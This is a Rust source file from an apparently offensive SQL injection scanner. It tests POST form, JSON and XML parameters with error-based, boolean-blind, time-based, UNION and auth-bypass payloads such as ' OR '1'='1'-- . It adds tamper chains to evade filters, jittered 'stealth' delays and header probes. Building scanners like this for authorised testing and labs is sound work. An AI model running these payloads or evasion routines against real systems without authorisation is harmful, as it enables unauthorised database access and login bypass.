use anyhow::Result;
use regex::Regex;
use tracing::{debug, info, warn};

use crate::sqx::detector::SqliDetector;
use crate::sqx::evasion::tamper_chain::TamperChain;
use crate::sqx::http::build_post_body;
use crate::sqx::models::{SqliTechnique, SqliTestResult};
use crate::sqx::similarity::{calculate_similarity, detect_sql_error};

impl SqliDetector {
    /// Test POST body parameters for SQL injection.
    ///
    /// `content_type`: `"form"` | `"json"` | `"xml"`
    pub async fn test_url_post(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
    ) -> Result<Vec<SqliTestResult>> {
        self.test_url_post_with_optional_tamper(url, post_body, content_type, None)
            .await
    }

    /// Test POST body parameters for SQL injection with an explicit tamper chain.
    pub async fn test_url_post_with_tamper(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
        tamper: &TamperChain,
    ) -> Result<Vec<SqliTestResult>> {
        self.test_url_post_with_optional_tamper(url, post_body, content_type, Some(tamper))
            .await
    }

    async fn test_url_post_with_optional_tamper(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
        tamper: Option<&TamperChain>,
    ) -> Result<Vec<SqliTestResult>> {
        info!(
            "Starting POST SQL injection scan against: {} ({})",
            url, content_type
        );
        let mut results = Vec::new();

        let params: Vec<(String, String)> = match content_type {
            "json" => match serde_json::from_str::<serde_json::Value>(post_body) {
                Ok(serde_json::Value::Object(map)) => map
                    .into_iter()
                    .filter_map(|(k, v)| {
                        let val = match &v {
                            serde_json::Value::String(s) => s.clone(),
                            serde_json::Value::Number(n) => n.to_string(),
                            _ => return None,
                        };
                        Some((k, val))
                    })
                    .collect(),
                _ => {
                    warn!("Failed to parse POST body as JSON");
                    vec![]
                }
            },
            "xml" => {
                let re = Regex::new(r"<([^/>\s]+)>([^<]*)</[^>]+>")
                    .unwrap_or_else(|_| Regex::new(r"x").unwrap());
                re.captures_iter(post_body)
                    .map(|cap| (cap[1].to_string(), cap[2].to_string()))
                    .collect()
            }
            _ => post_body
                .split('&')
                .filter_map(|pair| {
                    let mut parts = pair.splitn(2, '=');
                    let k = parts.next()?.to_string();
                    let v = parts.next().unwrap_or("").to_string();
                    Some((k, v))
                })
                .collect(),
        };

        if params.is_empty() {
            warn!("No parameters found in POST body");
            return Ok(results);
        }

        let ct_header = match content_type {
            "json" => "application/json",
            "xml" => "application/xml",
            _ => "application/x-www-form-urlencoded",
        };

        let baseline = self
            .send_post_request(url, post_body.to_string(), ct_header)
            .await?;

        'param_loop: for (param, original_value) in &params {
            if self.is_scan_cancelled() {
                break 'param_loop;
            }

            // Phase 1: cheap error/time probe with a bare quote and double-quote.
            // Fires fast path for error-based and time-based findings.
            for probe in &["'", "\""] {
                let raw_injected = format!("{}{}", original_value, probe);
                let injected = match tamper {
                    Some(chain) => chain.apply(&raw_injected),
                    None => raw_injected,
                };
                let modified_body = build_post_body(post_body, param, &injected, content_type);
                let resp = match self.send_post_request(url, modified_body, ct_header).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                if let Some(error_evidence) = detect_sql_error(&resp.body) {
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::ErrorBased,
                        confidence: 0.9,
                        payload: injected.clone(),
                        evidence: error_evidence,
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                        self.config.delay_ms,
                        self.config.stealth.jitter_pct,
                    ))
                    .await;
                    continue 'param_loop;
                }

                if resp.duration.as_secs() >= 5 {
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::TimeBased,
                        confidence: 0.75,
                        payload: injected.clone(),
                        evidence: format!("Response delayed: {}ms", resp.duration.as_millis()),
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                        self.config.delay_ms,
                        self.config.stealth.jitter_pct,
                    ))
                    .await;
                    continue 'param_loop;
                }
            }

            // Phase 2: boolean-blind context probe. Try each quote context with a
            // TRUE/FALSE pair; confirmed context determines the reported bypass.
            let is_numeric = original_value.parse::<i64>().is_ok();
            let contexts: Vec<(&str, String, String, String)> = if is_numeric {
                vec![
                    (
                        "numeric",
                        format!("{} AND 1=1", original_value),
                        format!("{} AND 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                    (
                        "numeric-or",
                        format!("{} OR 1=1", original_value),
                        format!("{} OR 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                    (
                        "single-quote",
                        format!("{}' AND '1'='1", original_value),
                        format!("{}' AND '1'='2", original_value),
                        format!("{}' OR '1'='1'-- ", original_value),
                    ),
                    (
                        "single-quote-or",
                        format!("{}' OR '1'='1", original_value),
                        format!("{}' OR '1'='2", original_value),
                        format!("{}' OR '1'='1'-- ", original_value),
                    ),
                    (
                        "double-quote",
                        format!("{}\" AND \"1\"=\"1", original_value),
                        format!("{}\" AND \"1\"=\"2", original_value),
                        format!("{}\" OR \"1\"=\"1\"-- ", original_value),
                    ),
                    (
                        "double-quote-or",
                        format!("{}\" OR \"1\"=\"1", original_value),
                        format!("{}\" OR \"1\"=\"2", original_value),
                        format!("{}\" OR \"1\"=\"1\"-- ", original_value),
                    ),
                ]
            } else {
                vec![
                    (
                        "single-quote",
                        format!("{}' AND '1'='1", original_value),
                        format!("{}' AND '1'='2", original_value),
                        format!("{}'-- ", original_value),
                    ),
                    (
                        "single-quote-or",
                        format!("{}' OR '1'='1", original_value),
                        format!("{}' OR '1'='2", original_value),
                        format!("{}' OR '1'='1'-- ", original_value),
                    ),
                    (
                        "double-quote",
                        format!("{}\" AND \"1\"=\"1", original_value),
                        format!("{}\" AND \"1\"=\"2", original_value),
                        format!("{}\"-- ", original_value),
                    ),
                    (
                        "double-quote-or",
                        format!("{}\" OR \"1\"=\"1", original_value),
                        format!("{}\" OR \"1\"=\"2", original_value),
                        format!("{}\" OR \"1\"=\"1\"-- ", original_value),
                    ),
                    (
                        "numeric",
                        format!("{} AND 1=1", original_value),
                        format!("{} AND 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                    (
                        "numeric-or",
                        format!("{} OR 1=1", original_value),
                        format!("{} OR 1=2", original_value),
                        format!("{} OR 1=1-- ", original_value),
                    ),
                ]
            };

            for (ctx, true_pl, false_pl, bypass) in &contexts {
                let true_payload = match tamper {
                    Some(chain) => chain.apply(true_pl),
                    None => true_pl.clone(),
                };
                let true_body = build_post_body(post_body, param, &true_payload, content_type);
                let true_resp = match self.send_post_request(url, true_body, ct_header).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                    self.config.delay_ms,
                    self.config.stealth.jitter_pct,
                ))
                .await;

                let false_payload = match tamper {
                    Some(chain) => chain.apply(false_pl),
                    None => false_pl.clone(),
                };
                let false_body = build_post_body(post_body, param, &false_payload, content_type);
                let false_resp = match self.send_post_request(url, false_body, ct_header).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                // Only skip on rate-limit or transport errors — a status change
                // between baseline and probe is a SIGNAL, not noise.
                if true_resp.status == 429 || false_resp.status == 429 {
                    debug!(
                        "Skip ctx={} on param={}: rate-limited (true={} false={})",
                        ctx, param, true_resp.status, false_resp.status
                    );
                    continue;
                }

                let true_sim = calculate_similarity(&baseline.body, &true_resp.body);
                let false_sim = calculate_similarity(&baseline.body, &false_resp.body);

                debug!(
                    "Boolean blind ctx={} param={}: true_sim={:.4} false_sim={:.4} gap={:.4}",
                    ctx,
                    param,
                    true_sim,
                    false_sim,
                    true_sim - false_sim,
                );

                // Pattern A: classic data-display boolean-blind.
                // TRUE probe matches baseline, FALSE probe diverges.
                // Use a relative gap instead of an absolute false_sim threshold so we
                // catch targets where TRUE/FALSE pages differ by only a few percent
                // (e.g. a different small image on success vs fail: ~3% body delta).
                let sim_gap = true_sim - false_sim;
                let classic = true_resp.status == baseline.status
                    && false_resp.status == baseline.status
                    && true_sim > 0.9
                    && sim_gap > 0.02;

                // Pattern B: auth-bypass. Probe the actual bypass payload.
                // If response differs strongly from baseline (status change or
                // big body delta), the injection closes the string context.
                let bypass_payload = match tamper {
                    Some(chain) => chain.apply(bypass),
                    None => bypass.clone(),
                };
                let bypass_body_str =
                    build_post_body(post_body, param, &bypass_payload, content_type);
                let bypass_resp = match self
                    .send_post_request(url, bypass_body_str, ct_header)
                    .await
                {
                    Ok(r) => r,
                    Err(_) => {
                        // If bypass probe fails, still fall through on Pattern A.
                        if classic {
                            info!(
                                "Boolean-blind confirmed on param={} context={} (T={:.2}, F={:.2})",
                                param, ctx, true_sim, false_sim
                            );
                            results.push(SqliTestResult {
                                parameter: param.clone(),
                                technique: SqliTechnique::BooleanBlind,
                                confidence: 0.9,
                                payload: bypass_payload.clone(),
                                evidence: format!(
                                    "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                    ctx, true_sim * 100.0, false_sim * 100.0, bypass_payload
                                ),
                                dbms_hint: None,
                                injection_context: None,
                                payload_id: None,
                            });

                            break;
                        }
                        continue;
                    }
                };

                if bypass_resp.status == 429 {
                    debug!("Bypass probe rate-limited for ctx={} param={}", ctx, param);
                    // Fall through on Pattern A only.
                    if classic {
                        results.push(SqliTestResult {
                            parameter: param.clone(),
                            technique: SqliTechnique::BooleanBlind,
                            confidence: 0.9,
                            payload: bypass_payload.clone(),
                            evidence: format!(
                                "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                ctx,
                                true_sim * 100.0,
                                false_sim * 100.0,
                                bypass_payload
                            ),
                            dbms_hint: None,
                            injection_context: None,
                            payload_id: None,
                        });

                        break;
                    }
                    continue;
                }

                let bypass_sim = calculate_similarity(&baseline.body, &bypass_resp.body);
                let status_changed =
                    bypass_resp.status != baseline.status && bypass_resp.status < 500;
                let auth_bypass = status_changed || bypass_sim < 0.5;

                if classic || auth_bypass {
                    let (conf, evidence) = if auth_bypass {
                        (
                            0.95,
                            format!(
                                "Context={} auth-bypass confirmed: baseline status={} → bypass status={}, sim={:.0}%. Payload: {}",
                                ctx,
                                baseline.status,
                                bypass_resp.status,
                                bypass_sim * 100.0,
                                bypass_payload
                            ),
                        )
                    } else {
                        (
                            0.9,
                            format!(
                                "Context={} TRUE sim={:.0}%, FALSE sim={:.0}%. Bypass payload: {}",
                                ctx,
                                true_sim * 100.0,
                                false_sim * 100.0,
                                bypass_payload
                            ),
                        )
                    };
                    info!(
                        "Boolean-blind confirmed on param={} context={} (auth_bypass={})",
                        param, ctx, auth_bypass
                    );
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::BooleanBlind,
                        confidence: conf,
                        payload: bypass_payload,
                        evidence,
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    break;
                }
            }

            if self.config.techniques.contains(&SqliTechnique::TimeBased) {
                let payload = format!(
                    "{}' AND SLEEP({})-- ",
                    original_value,
                    self.sleep_duration_secs()
                );
                let test_payload = match tamper {
                    Some(chain) => chain.apply(&payload),
                    None => payload,
                };
                let injected_body = build_post_body(post_body, param, &test_payload, content_type);
                let resp = match self.send_post_request(url, injected_body, ct_header).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let sleep_threshold = self.sleep_duration_secs() - 1;
                if resp.duration.as_secs() >= sleep_threshold {
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::TimeBased,
                        confidence: 0.88,
                        payload: test_payload,
                        evidence: format!(
                            "Time delay detected: {}s (threshold {}s)",
                            resp.duration.as_secs(),
                            sleep_threshold
                        ),
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                }
            }

            if self.config.techniques.contains(&SqliTechnique::UnionBased) {
                // Try ORDER BY payloads to trigger an error
                // that reveals column count, then confirm with a UNION SELECT probe.
                let mut column_count: Option<usize> = None;
                let mut last_ok = 0usize;

                for i in 1..=20usize {
                    let raw_order_payload = format!("{}' ORDER BY {}-- ", original_value, i);
                    let order_payload = match tamper {
                        Some(chain) => chain.apply(&raw_order_payload),
                        None => raw_order_payload,
                    };
                    let order_body =
                        build_post_body(post_body, param, &order_payload, content_type);
                    match self.send_post_request(url, order_body, ct_header).await {
                        Ok(r) => {
                            if detect_sql_error(&r.body).is_some() {
                                if last_ok > 0 {
                                    column_count = Some(last_ok);
                                }
                                break;
                            }
                            last_ok = i;
                        }
                        Err(_) => break,
                    }
                    tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                        self.config.delay_ms,
                        self.config.stealth.jitter_pct,
                    ))
                    .await;
                }

                // If ORDER BY didn't reveal count, try UNION SELECT NULL,... fallback.
                if column_count.is_none() && last_ok == 0 {
                    'union_count: for n in (1..=20usize).rev() {
                        let nulls = (0..n).map(|_| "NULL").collect::<Vec<_>>().join(",");
                        let raw_union_payload =
                            format!("{}' UNION SELECT {}-- ", original_value, nulls);
                        let union_payload = match tamper {
                            Some(chain) => chain.apply(&raw_union_payload),
                            None => raw_union_payload,
                        };
                        let union_body =
                            build_post_body(post_body, param, &union_payload, content_type);
                        match self.send_post_request(url, union_body, ct_header).await {
                            Ok(r) => {
                                if detect_sql_error(&r.body).is_none() {
                                    let sim = calculate_similarity(&baseline.body, &r.body);
                                    // Response must differ from baseline to confirm injection took effect.
                                    if sim < 0.95 || r.status != baseline.status {
                                        column_count = Some(n);
                                        break 'union_count;
                                    }
                                }
                            }
                            Err(_) => {}
                        }
                        tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                            self.config.delay_ms,
                            self.config.stealth.jitter_pct,
                        ))
                        .await;
                    }
                }

                if let Some(ncols) = column_count {
                    info!("POST UNION: found {} columns on param={}", ncols, param);
                    results.push(SqliTestResult {
                        parameter: param.clone(),
                        technique: SqliTechnique::UnionBased,
                        confidence: 0.88,
                        payload: match tamper {
                            Some(chain) => chain.apply(&format!(
                                "{}' UNION SELECT {}-- ",
                                original_value,
                                (1..=ncols)
                                    .map(|n| n.to_string())
                                    .collect::<Vec<_>>()
                                    .join(",")
                            )),
                            None => format!(
                                "{}' UNION SELECT {}-- ",
                                original_value,
                                (1..=ncols)
                                    .map(|n| n.to_string())
                                    .collect::<Vec<_>>()
                                    .join(",")
                            ),
                        },
                        evidence: format!(
                            "POST UNION-based injection: {} columns detected via ORDER BY/UNION SELECT probe.",
                            ncols
                        ),
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                }
            }

            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                self.config.delay_ms,
                self.config.stealth.jitter_pct,
            ))
            .await;
        }

        // Also probe injectable HTTP headers via POST — covers Less-18 style targets
        // that only log User-Agent / X-Forwarded-For when a POST request is submitted.
        let header_results = match tamper {
            Some(chain) => {
                self.test_headers_post_with_tamper(url, post_body, content_type, chain)
                    .await
            }
            None => self.test_headers_post(url, post_body, content_type).await,
        };
        results.extend(header_results);

        info!(
            "POST SQL injection scan complete. Found {} vulnerabilities",
            results.len()
        );
        Ok(results)
    }
}
